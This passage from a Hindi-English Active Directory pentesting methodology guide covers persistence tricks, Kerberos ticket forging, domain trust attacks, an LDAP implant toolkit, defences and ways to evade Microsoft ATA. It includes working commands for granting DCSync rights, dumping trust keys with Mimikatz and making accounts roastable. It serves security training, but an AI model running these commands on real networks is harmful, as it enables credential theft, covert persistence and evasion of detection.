Compromised user के पास कुछ domain objects पर कुछ **interesting privileges** हो सकते हैं जो आपको बाद में lateral movement/privilege escalation करने की अनुमति दे सकते हैं।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain के अंदर यदि कोई **Spool service listening** मिलती है तो उसे **abuse** करके **नए credentials प्राप्त** किए जा सकते हैं और **privileges escalate** किए जा सकते हैं।

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

यदि **other users** compromised machine तक पहुँचते हैं, तो memory से credentials **gather** करना और उनके processes में beacons **inject** करके उनकी impersonation करना संभव है।\
आम तौर पर उपयोगकर्ता system तक RDP के माध्यम से पहुँचते हैं, इसलिए यहाँ third party RDP sessions पर कुछ attacks कैसे करने हैं:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** एक सिस्टम प्रदान करता है जो domain-joined कंप्यूटरों पर **local Administrator password** को manage करता है, सुनिश्चित करता है कि वह **randomized**, unique, और अक्सर **changed** हो। ये passwords Active Directory में store होते हैं और केवल authorized users को ACLs के माध्यम से access दिया जाता है। यदि किसी के पास इन passwords को access करने की पर्याप्त permissions हों, तो वह अन्य कंप्यूटरों पर pivot कर सकता है।

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

compromised machine से **certificates gather** करना environment के अंदर privileges escalate करने का एक तरीका हो सकता है:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

यदि **vulnerable templates** configure की गई हों तो इन्हें abuse करके privileges escalate करना संभव है:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

एक बार जब आपको **Domain Admin** या उससे भी बेहतर **Enterprise Admin** privileges मिल जाएँ, आप **domain database**: _ntds.dit_ को **dump** कर सकते हैं।

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

पहले चर्चा की गई कुछ techniques को persistence के लिए इस्तेमाल किया जा सकता है।\
उदाहरण के लिए आप कर सकते हैं:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** एक specific service के लिए एक वैध Ticket Granting Service (TGS) ticket बनाता है, जो कि **NTLM hash** (उदाहरण के लिए, **PC account** के hash) का उपयोग करके किया जाता है। यह तरीका service privileges तक पहुँचने के लिए इस्तेमाल किया जाता है।

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** में attacker Active Directory (AD) environment में **krbtgt account** के **NTLM hash** तक पहुँच प्राप्त कर लेता है। यह account विशेष है क्योंकि यह सभी **Ticket Granting Tickets (TGTs)** को sign करने के लिए उपयोग होता है, जो AD नेटवर्क में authentication के लिए आवश्यक हैं।

एक बार attacker इस hash को प्राप्त कर लेता है, तो वह किसी भी account के लिए **TGTs** बना सकता है (Silver ticket attack).

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

ये golden tickets की तरह होते हैं पर इन्हें इस तरह forge किया जाता है कि वे सामान्य golden tickets detection mechanisms को **bypass** कर दें।

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

किसी account के **certificates होने या उन्हें request करने की क्षमता** उपयोगकर्ता के खाते में persist करने का एक बहुत अच्छा तरीका है (भले ही वह पासवर्ड बदल दे):

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

डोमेन के अंदर high privileges के साथ persist करने के लिए certificates का उपयोग भी संभव है:

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory में **AdminSDHolder** object privileged groups (जैसे Domain Admins और Enterprise Admins) की सुरक्षा सुनिश्चित करता है, इन समूहों पर एक standard **Access Control List (ACL)** लागू करके ताकि unauthorized बदलाव न हों। हालांकि, इस फीचर का दुरुपयोग भी किया जा सकता है; यदि attacker AdminSDHolder के ACL को modify करके किसी सामान्य user को full access दे देता है, तो वह user सभी privileged groups पर व्यापक नियंत्रण प्राप्त कर लेगा। यह सुरक्षा उपाय, जो सुरक्षा के लिए है, यदि सावधानी से मॉनिटर न किया जाए तो उल्टा प्रभाव डाल सकता है और अनधिकृत पहुँच की अनुमति दे सकता है।

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

हर **Domain Controller (DC)** में एक **local administrator** account मौजूद होता है। ऐसी मशीन पर admin rights प्राप्त करके local Administrator का hash **mimikatz** का उपयोग करके निकाला जा सकता है। इसके बाद remote access के लिए इस password का उपयोग सक्षम करने हेतु registry modification करना आवश्यक होता है।

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

आप किसी user को कुछ specific domain objects पर कुछ **special permissions** दे सकते हैं जो भविष्य में उस user को **privileges escalate** करने की अनुमति देंगे।

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** का उपयोग किसी object के ऊपर उसके **permissions** को **store** करने के लिए किया जाता है। यदि आप किसी object के **security descriptor** में सिर्फ़ एक **छोटा सा बदलाव** कर दें, तो आप उस object पर बिना privileged group का सदस्य बने भी बहुत महत्वपूर्ण privileges प्राप्त कर सकते हैं।

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

LSASS की memory में बदलाव करके एक **universal password** स्थापित कर दिया जाता है, जिससे सभी domain accounts तक पहुँच संभव हो जाती है।

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
आप अपना स्वयं का **SSP** बना सकते हैं ताकि machine तक पहुँचने के लिए उपयोग किए गए **credentials** को **clear text** में **capture** किया जा सके।

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

यह AD में एक **new Domain Controller** रजिस्टर करता है और निर्दिष्ट objects पर attributes (SIDHistory, SPNs...) **push** करता है, बिना किसी **modifications** के बारे में **logs** छोड़े। इसके लिए आपको **DA** privileges चाहिए और आपको **root domain** के अंदर होना चाहिए।\
ध्यान दें कि यदि आप गलत डेटा उपयोग करते हैं तो काफी बुरी logs दिखाई देंगी।

{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

पहले हमने चर्चा की थी कि यदि आपके पास **LAPS passwords पढ़ने की पर्याप्त permissions** हैं तो कैसे privileges escalate किए जा सकते हैं। हालाँकि, इन passwords का उपयोग **persistence बनाए रखने** के लिए भी किया जा सकता है।\
देखें:

{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft **Forest** को security boundary मानता है। इसका मतलब यह है कि **एक ही domain का compromise पूरे Forest के compromise में बदल सकता है**।

### Basic Information

एक [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) एक security mechanism है जो एक domain के user को दूसरे domain के resources तक पहुँचने की अनुमति देता है। यह मूल रूप से दोनों domains के authentication systems के बीच एक linkage बनाता है, जिससे authentication verifications सहज रूप से flow कर सकें। जब domains trust सेट करते हैं, तो वे अपने Domain Controllers (DCs) में specific **keys** को exchange और retain करते हैं, जो trust की integrity के लिए महत्वपूर्ण होते हैं।

एक सामान्य परिदृश्य में, यदि कोई user किसी **trusted domain** की सेवा का उपयोग करना चाहता है, तो उसे पहले अपने ही domain के DC से एक विशेष टिकट, जिसे **inter-realm TGT** कहा जाता है, का अनुरोध करना होगा। यह TGT उस साझा **key** से encrypt किया जाता है जिस पर दोनों domains सहमत होते हैं। फिर user इस inter-realm TGT को **trusted domain** के DC के पास पेश करता है ताकि उसे service टिकट (**TGS**) मिल सके। जब trusted domain का DC inter-realm TGT को validate कर लेता है, तो वह TGS जारी करता है और user को सेवा तक पहुँच मिल जाती है।

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

यह ध्यान देना महत्वपूर्ण है कि **a trust can be 1 way or 2 ways**। दोनों तरफ़ वाले विकल्प में, दोनों domains एक-दूसरे पर भरोसा करते हैं, लेकिन **1 way** trust संबंध में एक domain **trusted** होगा और दूसरा **trusting** domain होगा। इस स्थिति में, **आप केवल trusted domain से trusting domain के भीतर resources तक पहुँच पाएँगे**।

यदि Domain A, Domain B पर trust करता है, तो A trusting domain है और B trusted domain है। इसके अलावा, **Domain A** में यह एक **Outbound trust** होगा; और **Domain B** में यह एक **Inbound trust** होगा।

**Different trusting relationships**

- **Parent-Child Trusts**: यह एक सामान्य सेटअप है उसी forest के भीतर, जहाँ एक child domain अपने parent domain के साथ स्वचालित रूप से two-way transitive trust रखता है। इसका मतलब है कि authentication requests parent और child के बीच सहज रूप से flow कर सकती हैं।
- **Cross-link Trusts**: जिन्हें "shortcut trusts" भी कहा जाता है, ये child domains के बीच बनाए जाते हैं ताकि referral प्रक्रियाओं को तेज़ किया जा सके। जटिल forests में authentication referrals को आम तौर पर forest root तक ऊपर और फिर target domain तक नीचे जाना पड़ता है। cross-links बनाकर यह रास्ता छोटा कर दिया जाता है, जो भौगोलिक रूप से फैले वातावरण में उपयोगी है।
- **External Trusts**: ये अलग, unrelated domains के बीच सेट किए जाते हैं और स्वभावतः non-transitive होते हैं। Microsoft की documentation के अनुसार, external trusts उन मामलों में उपयोगी होते हैं जहाँ किसी domain के resources तक पहुँचने की आवश्यकता होती है जो current forest के बाहर है और जिसे forest trust द्वारा नहीं जोड़ा गया है। सुरक्षा को बढ़ाने के लिए external trusts के साथ SID filtering का उपयोग किया जाता है।
- **Tree-root Trusts**: ये trusts forest root domain और एक नए जोड़े गए tree root के बीच स्वचालित रूप से स्थापित होते हैं। हालांकि ये आमतौर पर नहीं मिलते, tree-root trusts forest में नए domain trees जोड़ने के लिए महत्वपूर्ण होते हैं, जिससे वे अनूठा domain नाम बनाए रख सकते हैं और two-way transitivity सुनिश्चित कर सकते हैं।
- **Forest Trusts**: यह trust दो forest root domains के बीच एक two-way transitive trust होता है, जो सुरक्षा उपायों को बढ़ाने के लिए SID filtering को भी लागू करता है।
- **MIT Trusts**: ये trusts गैर-Windows, RFC4120-compliant Kerberos domains के साथ स्थापित होते हैं। MIT trusts थोड़े अधिक specialized होते हैं और उन वातावरणों के लिए बनाए जाते हैं जहाँ Windows पारिस्थितिकी तंत्र के बाहर Kerberos-based systems के साथ एकीकरण की आवश्यकता होती है।

#### Other differences in **trusting relationships**

- एक trust relationship **transitive** भी हो सकती है (A trust B, B trust C, तब A trust C) या **non-transitive** भी हो सकती है।
- एक trust relationship **bidirectional trust** के रूप में सेट की जा सकती है (दोनों एक-दूसरे पर भरोसा करते हैं) या **one-way trust** के रूप में (सिर्फ़ एक ही दूसरे पर भरोसा करता है)।

### Attack Path

1. **Enumerate** the trusting relationships
2. Check if any **security principal** (user/group/computer) has **access** to resources of the **other domain**, maybe by ACE entries or by being in groups of the other domain. Look for **relationships across domains** (the trust was created for this probably).
1. kerberoast in this case could be another option.
3. **Compromise** the **accounts** which can **pivot** through domains.

Attackers with access to resources in another domain can pivot through three primary mechanisms:

- **Local Group Membership**: Principals को मशीनों पर local groups में जोड़ा जा सकता है, जैसे सर्वर पर “Administrators” group, जिससे उन्हें उस मशीन पर महत्वपूर्ण नियंत्रण मिल जाता है।
- **Foreign Domain Group Membership**: Principals foreign domain के groups के सदस्य भी हो सकते हैं। हालाँकि, इस पद्धति की प्रभावशीलता trust के प्रकार और group के scope पर निर्भर करती है।
- **Access Control Lists (ACLs)**: Principals को किसी **ACL**, विशेषकर **DACL** में **ACE** के रूप में निर्दिष्ट किया जा सकता है, जिससे उन्हें विशिष्ट resources तक पहुँच मिलती है। ACLs, DACLs, और ACEs के मैकेनिक्स में गहराई में जाने के लिए, whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” एक अमूल्य संसाधन है।

### Find external users/groups with permissions

आप domain में foreign security principals खोजने के लिए **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** चेक कर सकते हैं। ये **an external domain/forest** के user/group होंगे।

आप इसे **Bloodhound** में या **powerview** का उपयोग करके भी देख सकते हैं:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
डोमेन ट्रस्ट्स को एन्यूमरेट करने के अन्य तरीके:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> वहाँ **2 trusted keys** हैं, एक _Child --> Parent_ के लिए और दूसरा _Parent_ --> _Child_ के लिए।\
> आप वर्तमान domain द्वारा उपयोग की जाने वाली कुंजी को निम्न कमांड से प्राप्त कर सकते हैं:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Trust का दुरुपयोग करके SID-History injection के माध्यम से child/parent domain पर Enterprise admin के रूप में escalate करें:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

यह समझना कि Configuration Naming Context (NC) का कैसे exploitation किया जा सकता है, महत्वपूर्ण है। Configuration NC Active Directory (AD) वातावरण में पूरे forest के कॉन्फ़िगरेशन डेटा के लिए एक केंद्रीय रिपॉज़िटरी के रूप में काम करता है। यह डेटा forest के प्रत्येक Domain Controller (DC) पर replicate होता है, और writable DCs Configuration NC की writable कॉपी बनाए रखते हैं। इसे exploit करने के लिए, आपके पास किसी DC पर **SYSTEM privileges on a DC** होने चाहिए, बेहतर होगा कि child DC हो।

**Link GPO to root DC site**

Configuration NC के Sites container में AD forest के भीतर सभी domain-joined computers की साइट्स की जानकारी शामिल होती है। किसी भी DC पर SYSTEM privileges लेकर, attackers GPOs को root DC sites से link कर सकते हैं। यह क्रिया उन साइट्स पर लागू नीतियों को बदलकर root domain को संभावित रूप से compromise कर सकती है।

विस्तृत जानकारी के लिए आप [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) पर रिसर्च देख सकते हैं।

**Compromise any gMSA in the forest**

एक attack vector में domain के भीतर privileged gMSAs को target करना शामिल है। gMSAs के पासवर्ड की गणना के लिए आवश्यक KDS Root key Configuration NC में स्टोर होती है। किसी भी DC पर SYSTEM privileges के साथ, KDS Root key तक पहुँचकर पूरे forest के किसी भी gMSA के लिए पासवर्ड compute करना संभव है।

विस्तृत विश्लेषण और स्टेप-बाय-स्टेप गाइड नीचे है:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

पूरक delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

अतिरिक्त बाहरी रिसर्च: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

यह method धैर्य मांगती है, नए privileged AD objects के बनने का इंतज़ार करना पड़ता है। SYSTEM privileges के साथ, attacker AD Schema को modify कर सकता है ताकि किसी भी user को सभी classes पर पूर्ण नियंत्रण दिया जा सके। इससे नए बनाए गए AD objects पर unauthorized access और control प्राप्त हो सकता है।

अधिक पढ़ने के लिए देखें: [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability का लक्ष्य Public Key Infrastructure (PKI) objects पर नियंत्रण पाकर एक certificate template बनाना है जो forest के किसी भी user के रूप में authentication संभव करे। चूंकि PKI objects Configuration NC में रहते हैं, इसलिए किसी writable child DC को compromise करना ESC5 attacks को निष्पादित करने में सक्षम बनाता है।

इस पर अधिक जानकारी [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c) में पढ़ी जा सकती है। ADCS न होने की स्थिति में, attacker आवश्यक components सेटअप करने में सक्षम होता है, जैसा कि [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) में चर्चा है।

### External Forest Domain - One-Way (Inbound) या दो-तरफ़ा
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
इस परिदृश्य में **आपके डोमेन को एक बाहरी डोमेन द्वारा ट्रस्ट किया गया है**, जो आपको उस पर **अनिर्धारित अनुमतियाँ** देता है। आपको पता लगाना होगा कि **आपके डोमेन के कौन से principals को बाहरी डोमेन पर कौन-सी पहुँच है** और फिर उसे exploit करने का प्रयास करना होगा:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### बाहरी फ़ॉरेस्ट डोमेन - एक-तरफा (आउटबाउंड)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
इस परिदृश्य में **आपका डोमेन** किसी **different domains** के प्रिंसिपल को कुछ **privileges** ट्रस्ट कर रहा है।

हालाँकि, जब एक **domain is trusted** trusting domain द्वारा, तो trusted domain एक **user** बनाता है जिसका नाम **predictable** होता है और जो **password** के रूप में **trusted password** का उपयोग करता है। इसका मतलब यह है कि यह संभव है कि trusting domain का कोई **user** trusted डोमेन के अंदर पहुँच कर उसे एन्यूमेरालाइज़ करे और अधिक अधिकार प्राप्त करने की कोशिश करे:

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted डोमेन का नुकसान पहुँचाने का एक और तरीका है कि आप एक [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) खोजें जो domain trust की **opposite direction** में बनाया गया हो (यह आम नहीं होता)।

trusted डोमेन को compromise करने का दूसरा तरीका यह है कि उस मशीन पर रुक जाना जहाँ से एक **user from the trusted domain can access** करके **RDP** से लॉगिन कर सके। फिर attacker RDP session process में कोड inject कर सकता है और वहाँ से **access the origin domain of the victim** कर सकता है.\
इसके अलावा, यदि **victim ने अपना hard drive mount किया हुआ है**, तो **RDP session** process से attacker **backdoors** को **startup folder of the hard drive** में रख सकता है। इस तकनीक को **RDPInception** कहा जाता है।

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- Forest trusts के पार SID history attribute का उपयोग करके होने वाले हमलों के जोखिम को SID Filtering से घटाया जाता है, जो सभी inter-forest trusts पर डिफ़ॉल्ट रूप से सक्रिय रहती है। यह Microsoft के रुख के अनुसार यह मानकर चलता है कि forest ही सुरक्षा सीमा है न कि domain, इसलिए intra-forest trusts सुरक्षित माने जाते हैं।
- हालाँकि, एक समस्या यह है कि SID filtering कुछ applications और user एक्सेस को बाधित कर सकती है, इसलिए इसे कभी-कभी डिसेबल भी किया जाता है।

### **Selective Authentication:**

- inter-forest trusts के लिए, Selective Authentication का उपयोग यह सुनिश्चित करता है कि दोनों forests के users स्वचालित रूप से authenticated न हों। इसके बजाय, उपयोगकर्ताओं के लिए explicit permissions आवश्यक होते हैं ताकि वे trusting domain या forest के भीतर domains और servers तक पहुँच सकें।
- यह नोट करना महत्वपूर्ण है कि ये उपाय writable Configuration Naming Context (NC) के शोषण या trust account पर हमलों से सुरक्षा प्रदान नहीं करते।

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) bloodyAD-style LDAP primitives को x64 Beacon Object Files के रूप में फिर से लागू करता है जो पूरी तरह से एक on-host implant (उदा., Adaptix C2) के अंदर चलते हैं। Operators पैक को `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` से कंपाइल करते हैं, `ldap.axs` लोड करते हैं, और फिर beacon से `ldap <subcommand>` कॉल करते हैं। सारा ट्रैफ़िक मौजूदा logon security context पर LDAP (389) के साथ signing/sealing या LDAPS (636) के साथ auto certificate trust के माध्यम से जाता है, इसलिए किसी socks proxy या डिस्क आर्टिफैक्ट की आवश्यकता नहीं होती।

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` शॉर्ट नाम/OU paths को पूर्ण DNs में resolve करके संबंधित objects को dump करते हैं।
- `get-object`, `get-attribute`, and `get-domaininfo` arbitrary attributes (including security descriptors) और `rootDSE` से forest/domain metadata खींचते हैं।
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` roasting candidates, delegation settings, और मौजूदा [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors को सीधे LDAP से उजागर करते हैं।
- `get-acl` और `get-writable --detailed` DACL को parse करके trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), और inheritance सूचीबद्ध करते हैं, जिससे ACL privilege escalation के लिए तुरंत लक्षित वस्तुएँ मिलती हैं।
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP लेखन प्रिमिटिव्स — अधिकार वृद्धि और स्थायित्व के लिए

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) ऑपरेटर को जहाँ भी OU अधिकार मौजूद हों वहां नए principals या machine accounts स्टेज करने देते हैं. `add-groupmember`, `set-password`, `add-attribute`, और `set-attribute` सीधे टार्गेट्स को हाईजैक कर लेते हैं जब write-property अधिकार मिल जाते हैं.
- ACL-focused commands जैसे `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, और `add-dcsync` किसी भी AD ऑब्जेक्ट पर WriteDACL/WriteOwner को पासवर्ड रिसेट्स, group membership नियंत्रण, या DCSync replication privileges में बदल देते हैं बिना PowerShell/ADSI artefacts छोड़े. `remove-*` समकक्ष इन्जेक्ट किए गए ACEs को क्लीनअप करते हैं.

### Delegation, roasting, और Kerberos दुरुपयोग

- `add-spn`/`set-spn` तुरंत एक compromised user को Kerberoastable बना देते हैं; `add-asreproastable` (UAC toggle) इसे AS-REP roasting के लिए चिह्नित करता है बिना पासवर्ड को छुए.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) beacon से `msDS-AllowedToDelegateTo`, UAC flags, या `msDS-AllowedToActOnBehalfOfOtherIdentity` को rewrite करते हैं, constrained/unconstrained/RBCD attack paths को सक्षम करते हैं और remote PowerShell या RSAT की आवश्यकता को समाप्त कर देते हैं.

### sidHistory injection, OU relocation, और attack surface shaping

- `add-sidhistory` नियंत्रित principal के SID history में privileged SIDs inject करता है (देखें [SID-History Injection](sid-history-injection.md)), जिससे LDAP/LDAPS के माध्यम से छुपा हुआ access inheritance मिलता है.
- `move-object` कंप्यूटरों या उपयोगकर्ताओं का DN/OU बदलता है, जिससे एक हमलावर assets को उन OUs में ला सकता है जहाँ पहले से delegated rights मौजूद हैं, और फिर `set-password`, `add-groupmember`, या `add-spn` का दुरुपयोग कर सकता है.
- Tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, आदि) ऑपरेटर द्वारा credentials या persistence हार्वेस्ट करने के बाद तेज rollback की अनुमति देते हैं, जिससे telemetry कम से कम रहती है.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## कुछ सामान्य सुरक्षा उपाय

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **क्रेडेंशियल सुरक्षा के लिए रक्षात्मक उपाय**

- **Domain Admins Restrictions**: अनुशंसा की जाती है कि Domain Admins को केवल Domain Controllers पर लॉगिन की अनुमति होनी चाहिए, और अन्य होस्ट्स पर उनका उपयोग टाला जाना चाहिए.
- **Service Account Privileges**: सुरक्षा बनाए रखने के लिए सेवाओं को Domain Admin (DA) privileges के साथ नहीं चलाना चाहिए.
- **Temporal Privilege Limitation**: DA privileges की आवश्यकता वाले कार्यों के लिए उनकी अवधि सीमित रखनी चाहिए. इसे निम्न द्वारा किया जा सकता है: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **डिसेप्शन तकनीकों को लागू करना**

- डिसेप्शन लागू करना ट्रैप सेट करने में शामिल है, जैसे decoy users या computers, जिनमें password never expires या Trusted for Delegation जैसे फीचर्स हो सकते हैं. विस्तृत तरीका में विशिष्ट अधिकारों के साथ users बनाना या उन्हें high privilege groups में जोड़ना शामिल है.
- एक व्यावहारिक उदाहरण में ऐसे टूल्स का उपयोग शामिल है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- डिसेप्शन तकनीकों को परिनियोजित करने के बारे में अधिक जानकारी के लिए देखें [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **डिसेप्शन की पहचान**

- **For User Objects**: संदिग्ध संकेतों में असामान्य ObjectSID, कम लॉगऑन आवृत्ति, निर्माण तिथियाँ, और low bad password counts शामिल हैं.
- **General Indicators**: संभावित decoy ऑब्जेक्ट्स के attributes की असली ऑब्जेक्ट्स से तुलना करने पर inconsistencies सामने आ सकती हैं. Tools like [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) ऐसी डिसेप्शन की पहचान में मदद कर सकते हैं.

### **डिटेक्शन सिस्टम्स को बाइपास करना**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection से बचने के लिए Domain Controllers पर session enumeration से बचें.
- **Ticket Impersonation**: Ticket निर्माण के लिए **aes** keys का उपयोग detection से बचने में मदद करता है क्योंकि यह NTLM पर डाउनग्रेड नहीं करता.
- **DCSync Attacks**: ATA detection से बचने के लिए non-Domain Controller से निष्पादन की सलाह दी जाती है, क्योंकि Domain Controller से सीधे निष्पादन alerts ट्रिगर करेगा.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
